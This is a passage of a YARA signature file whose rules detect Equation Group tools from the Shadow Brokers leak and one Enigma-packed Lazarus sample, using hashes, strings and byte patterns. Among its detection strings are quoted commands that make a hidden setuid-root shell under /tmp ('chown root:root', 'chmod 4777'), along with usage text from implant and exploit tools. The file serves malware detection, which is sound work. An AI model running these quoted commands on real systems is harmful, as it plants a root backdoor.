      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "04ccc060d401ddba674371e66e0288ebdbfa7df74b925c5c202109f23fb78504"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "USAGE: SetOurAddr <input file> <output file> <protocol> [IP/IPX address]" fullword ascii
      $s2 = "Replaced default IP address (127.0.0.1) with Local IP Address %d.%d.%d.%d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_SendPKTrigger_RID36EF : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:17:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2f9c7a857948795873a61f4d4f08e1bd0a41e3d6ffde212db389365488fa6e26"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "----====**** PORT KNOCK TRIGGER BEGIN ****====----" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
}

rule EquationGroup_Toolset_Apr17_DmGz_Target_2_RID36BF : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:09:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "55ac29b9a67e0324044dafaba27a7f01ca3d8e4d8e020259025195abe42aa904"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "\\\\.\\%ls" fullword ascii
      $op0 = { e8 ce 34 00 00 b8 02 00 00 f0 e9 26 02 00 00 48 } 
      $op1 = { 8b 4d 28 e8 02 05 00 00 89 45 34 eb 07 c7 45 34 } 
      $op2 = { e8 c2 34 00 00 90 48 8d 8c 24 00 01 00 00 e8 a4 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )
}

rule EquationGroup_Toolset_Apr17_mstcp32_DXGHLP16_tdip_RID391F : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:50:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-01-06"
      hash1 = "26215bc56dc31d2466d72f1f4e1b6388e62606e9949bc41c28968fcb9a9d60a6"
      hash2 = "fcfb56fa79d2383d34c471ef439314edc2239d632a880aa2de3cea430f6b5665"
      hash3 = "a5ec4d102d802ada7c5083af53fd9d3c9b5aa83be9de58dbb4fac7876faf6d29"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "\\Registry\\User\\CurrentUser\\" wide
      $s2 = "\\DosDevices\\%ws" wide
      $s3 = "\\Device\\%ws_%ws" wide
      $s4 = "sys\\mstcp32.dbg" fullword ascii
      $s5 = "%ws%03d%ws%wZ" fullword wide
      $s6 = "TCP/IP driver" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 4 of them )
}

rule EquationGroup_Toolset_Apr17_regprobe_RID354C : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:07:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "99a42440d4cf1186aad1fd09072bd1265e7c6ebbc8bcafc28340b4fe371767de"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Usage: %s targetIP protocolSequence portNo [redirectorIP] [CLSID]" fullword ascii
      $x2 = "key does not exist or pinging w2k system" fullword ascii
      $x3 = "RpcProxy=255.255.255.255:65536" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_GangsterThief_Implant_RID3A55 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:42:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "50b269bda5fedcf5a62ee0514c4b14d48d53dd18ac3075dcc80b52d0c2783e06"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "\\\\.\\%s:" fullword wide
      $s4 = "raw_open CreateFile error" fullword ascii
      $s5 = "-PATHDELETED-" ascii
      $s6 = "(deleted)" fullword wide
      $s8 = "NULLFILENAME" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 3 of them )
}

rule EquationGroup_Toolset_Apr17_SetCallbackPorts_RID3847 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:14:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "16f66c2593665c2507a78f96c0c2a9583eab0bda13a639e28f550c92f9134ff0"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "USAGE: %s <input file> <output file> <port1> [port2] [port3] [port4] [port5] [port6]" fullword ascii
      $s2 = "You may enter between 1 and 6 ports to change the defaults." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_DiBa_Target_BH_2000_RID3816 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:06:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0654b4b8727488769390cd091029f08245d690dd90d1120e8feec336d1f9e788"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "0M1U1Z1p1" fullword ascii
      $s14 = "SPRQWV" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
}

rule EquationGroup_Toolset_Apr17_rc5_RID3300 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 14:29:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "69e2c68c6ea7be338497863c0c5ab5c77d5f522f0a84ab20fe9c75c7f81318eb"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Usage: %s [d|e] session_key ciphertext" fullword ascii
      $s2 = "where session_key and ciphertext are strings of hex" fullword ascii
      $s3 = "d = decrypt mode, e = encrypt mode" fullword ascii
      $s4 = "Bad mode, should be 'd' or 'e'" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )
}

rule EquationGroup_Toolset_Apr17_PC_Level_Generic_RID37FC : APT DEMO EXE FILE GEN {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:01:51"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7a6488dd13936e505ec738dcc84b9fec57a5e46aab8aff59b8cfad8f599ea86a"
      hash2 = "0e3cfd48732d0b301925ea3ec6186b62724ec755ed40ed79e7cd6d3df511b8a0"
      hash3 = "d1d6e3903b6b92cc52031c963e2031b5956cadc29cc8b3f2c8f38be20f98a4a7"
      tags = "APT, DEMO, EXE, FILE, GEN"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "wshtcpip.WSHGetSocketInformation" fullword ascii
      $s2 = "\\\\.\\%hs" fullword ascii
      $s3 = ".?AVResultIp@Mini_Mcl_Cmd_NetConnections@@" fullword ascii
      $s4 = "Corporation. All rights reserved." fullword wide
      $s5 = { 49 83 3c 24 00 75 02 eb 5d 49 8b 34 24 0f b7 46 } 
      $op1 = { 44 24 57 6f c6 44 24 58 6e c6 44 24 59 } 
      $op2 = { c6 44 24 56 64 88 5c 24 57 } 
      $op3 = { 44 24 6d 4c c6 44 24 6e 6f c6 44 24 6f } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 2 of ( $s* ) or all of ( $op* ) )
}

rule EquationGroup_Toolset_Apr17_ParseCapture_RID36C5 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:10:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "c732d790088a4db148d3291a92de5a449e409704b12e00c7508d75ccd90a03f2"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "* Encrypted log found.  An encryption key must be provided" fullword ascii
      $x2 = "encryptionkey = e.g., \"00 11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff\"" fullword ascii
      $x3 = "Decrypting with key '%02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x'" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_ActiveDirectory_Target_RID3ACD : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 20:02:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "33c1b7fdee7c70604be1e7baa9eea231164e62d5d5090ce7f807f43229fe5c36"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "(&(objectCategory=person)(objectClass=user)(cn=" fullword wide
      $s2 = "(&(objectClass=user)(objectCategory=person)" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
}

rule EquationGroup_Toolset_Apr17_PC_Legacy_dll_RID36D8 : APT DEMO EXE FILE HIGHVOL {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:13:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0cbc5cc2e24f25cb645fb57d6088bcfb893f9eb9f27f8851503a1b33378ff22d"
      tags = "APT, DEMO, EXE, FILE, HIGHVOL"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 45 f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 } 
      $op2 = { 49 c6 45 e1 73 c6 45 e2 57 c6 45 e3 } 
      $op3 = { 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 6f c6 45 ea } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
}

rule EquationGroup_Toolset_Apr17_svctouch_RID3565 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:11:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "96b6a3c4f53f9e7047aa99fd949154745e05dc2fd2eb21ef6f0f9b95234d516b"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Causes: Firewall,Machine down,DCOM disabled\\not supported,etc." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 10KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_pwd_Implant_RID3675 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:56:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ee72ac76d82dfec51c8fbcfb5fc99a0a45849a4565177e01d8d23a358e52c542"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "7\"7(7/7>7O7]7o7w7" fullword ascii
      $op1 = { 40 50 89 44 24 18 FF 15 34 20 00 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_KisuComms_Target_2000_RID3978 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:05:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "94eea1bad534a1dc20620919de8046c9966be3dd353a50f25b719c3662f22135"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "363<3S3c3l3q3v3{3" fullword ascii
      $s2 = "3!3%3)3-3135393@5" fullword ascii
      $op0 = { eb 03 89 46 54 47 83 ff 1a 0f 8c 40 ff ff ff 8b } 
      $op1 = { 8b 46 04 85 c0 74 0f 50 e8 34 fb ff ff 83 66 04 } 
      $op2 = { c6 45 fc 02 8d 8d 44 ff ff ff e8 d2 2f 00 00 eb } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( all of ( $s* ) or all of ( $op* ) ) )
}

rule EquationGroup_Toolset_Apr17_msgkd_msslu64_msgki_mssld_RID3C05 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 20:54:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9ab667b7b5b9adf4ff1d6db6f804824a22c7cc003eb4208d5b2f12809f5e69d0"
      hash2 = "320144a7842500a5b69ec16f81a9d1d4c8172bb92301afd07fb79bc0eca81557"
      hash3 = "c10f4b9abee0fde50fe7c21b9948a2532744a53bb4c578630a81d2911f6105a3"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "PQRAPAQSTUVWARASATAUAVAW" fullword ascii
      $s2 = "SQRUWVAWAVAUATASARAQAP" fullword ascii
      $s3 = "iijymqp" fullword ascii
      $s4 = "AWAVAUATASARAQI" fullword ascii
      $s5 = "WARASATAUAVM" fullword ascii
      $op1 = { 0c 80 30 02 48 83 c2 01 49 83 e9 01 75 e1 c3 cc } 
      $op2 = { e8 10 66 0d 00 80 66 31 02 48 83 c2 02 49 83 e9 } 
      $op3 = { 48 b8 53 a5 e1 41 d4 f1 07 00 48 33 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of ( $s* ) or all of ( $op* ) )
}

rule EquationGroup_Toolset_Apr17_SetCallback_RID362F : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:45:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a8854f6b01d0e49beeb2d09e9781a6837a0d18129380c6e1b1629bc7c13fdea2"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "*NOTE: This version of SetCallback does not work with PeddleCheap versions prior" fullword ascii
      $s3 = "USAGE: SetCallback <input file> <output file>" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )
}

rule EquationGroup_Toolset_Apr17__vtuner_vtuner_1_RID388C : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:25:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3e6bec0679c1d8800b181f3228669704adb2e9cbf24679f4a1958e4cdd0e1431"
      hash2 = "b0d2ebf455092f9d1f8e2997237b292856e9abbccfbbebe5d06b382257942e0e"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Unable to get -w hash.  %x" fullword wide
      $s2 = "!\"invalid instruction mnemonic constant Id3vil\"" fullword wide
      $s4 = "Unable to set -w provider. %x" fullword wide
      $op0 = { 2b c7 50 e8 3a 8c ff ff ff b6 c0 } 
      $op2 = { a1 8c 62 47 00 81 65 e0 ff ff ff 7f 03 d8 8b c1 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 2 of them )
}

rule EquationGroup_Toolset_Apr17__ecwi_ESKE_EVFR_RPC2_2_RID391D : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:50:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "c4152f65e45ff327dade50f1ac3d3b876572a66c1ce03014f2877cea715d9afd"
      hash2 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
      hash3 = "c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Target is share name" fullword ascii
      $s2 = "Could not make UdpNetbios header -- bailing" fullword ascii
      $s3 = "Request non-NT session key" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
}

rule EquationGroup_Toolset_Apr17__EAFU_ecwi_ESKE_EVFR_RPC2_4_RID3A9F : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:54:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3e181ca31f1f75a6244b8e72afaa630171f182fbe907df4f8b656cc4a31602f6"
      hash2 = "c4152f65e45ff327dade50f1ac3d3b876572a66c1ce03014f2877cea715d9afd"
      hash3 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "* Listening Post DLL %s() returned error code %d." fullword ascii
      $s1 = "WsaErrorTooManyProcesses" fullword ascii
      $s2 = "NtErrorMoreProcessingRequired" fullword ascii
      $s3 = "Connection closed by remote host (TCP Ack/Fin)" fullword ascii
      $s4 = "ServerErrorBadNamePassword" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of ( $s* ) or 1 of ( $x* ) )
}

rule EquationGroup_Toolset_Apr17__SendCFTrigger_SendPKTrigger_6_RID3D29 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 21:42:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3bee31b9edca8aa010a4684c2806b0ca988b2bcc14ad0964fec4f11f3f6fb748"
      hash2 = "2f9c7a857948795873a61f4d4f08e1bd0a41e3d6ffde212db389365488fa6e26"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "* Failed to connect to destination - %u" fullword wide
      $s6 = "* Failed to convert destination address into sockaddr_storage values" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17__ESKE_RPC2_8_RID358A : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:17:31"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
      hash2 = "5c0896dbafc5d8cc19b1bc7924420b20ed5999ac5bee2cb5a91aada0ea01e337"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "Fragment: Packet too small to contain RPC header" fullword ascii
      $s5 = "Fragment pickup: SmbNtReadX failed" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17__ELV_ESKE_ETBL_ETRE_EVFR_11_RID3A2B : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:35:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f"
      hash2 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
      hash3 = "70db3ac2c1a10de6ce6b3e7a7890c37bffde006ea6d441f5de6d8329add4d2ef"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Target is vulnerable" fullword ascii
      $x2 = "Target is NOT vulnerable" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17__ELV_ESKE_13_RID3586 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:16:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f"
      hash2 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Skip call to PackageRideArea().  Payload has already been packaged. Options -x and -q ignored." fullword ascii
      $s2 = "ERROR: pGvars->pIntRideAreaImplantPayload is NULL" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17__ETBL_ETRE_SMBTOUCH_17_RID3896 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:27:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "70db3ac2c1a10de6ce6b3e7a7890c37bffde006ea6d441f5de6d8329add4d2ef"
      hash2 = "e0f05f26293e3231e4e32916ad8a6ee944af842410c194fce8a0d8ad2f5c54b2"
      hash3 = "7da350c964ea43c149a12ac3d2ce4675cedc079ddc10d1f7c464b16688305309"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "ERROR: Connection terminated by Target (TCP Ack/Fin)" fullword ascii
      $s2 = "Target did not respond within specified amount of time" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )
}

rule Enigma_Protector_LazarusSample_RID3326 : APT DEMO EXE FILE T1027_002 {
   meta:
      description = "Detects malware packed with the Enigma protector"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/sas/77908/lazarus-under-the-hood/"
      date = "2017-04-12 14:35:31"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d4616f9706403a0d5a2f9a8726230a4693e4c95c58df5c753ccc684f1d3542e2"
      tags = "APT, DEMO, EXE, FILE, T1027_002"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 5d 5d 5d aa bf 5e 95 d6 dc 51 5d 5d 5d 5e 98 0d } 
      $op2 = { 52 d9 47 5d 5d 5d dd a6 b4 52 d9 4c 5d 5d 5d 3b } 
      $op3 = { 9f 59 14 52 d8 a9 a2 a2 a2 00 9f 51 5d d6 d1 79 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
}

rule EquationGroup_store_linux_i386_v_3_3_0_RID3570 : APT DEMO FILE G0020 LINUX {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 16:13:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "abc27fda9a0921d7cf2863c29768af15fdfe47a0b3e7a131ef7e5cc057576fbc"
      tags = "APT, DEMO, FILE, G0020, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "[-] Failed to map file: %s" fullword ascii
      $s2 = "[-] can not NULL terminate input data" fullword ascii
      $s3 = "[!] Name has size of 0!" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 60KB and all of them )
}

rule EquationGroup_cursehelper_win2k_i686_v_2_2_0_RID37A1 : APT DEMO EXE FILE G0020 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 17:46:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "5ac6fde8a06f4ade10d672e60e92ffbf78c4e8db6b5152e23171f6f53af0bfe1"
      tags = "APT, DEMO, EXE, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/{}" fullword ascii
      $op1 = { 8d b5 48 ff ff ff 89 34 24 e8 56 2a 00 00 c7 44 } 
      $op2 = { e9 a2 f2 ff ff ff 85 b4 fe ff ff 8b 95 a8 fe ff } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them )
}

rule EquationGroup_tmpwatch_RID302B : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 12:28:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "65ed8066a3a240ee2e7556da74933a9b25c5109ffad893c21a626ea1b686d7c1"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "chown root:root /tmp/.scsi/dev/bin/gsh" fullword ascii
      $s2 = "chmod 4777 /tmp/.scsi/dev/bin/gsh" fullword ascii
   condition: 
      ( filesize < 1KB and 1 of them )
}

rule EquationGroup_orleans_stride_sunos5_9_v_2_4_0_RID388D : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 18:26:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "6a30efb87b28e1a136a66c7708178c27d63a4a76c9c839b2fc43853158cb55ff"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
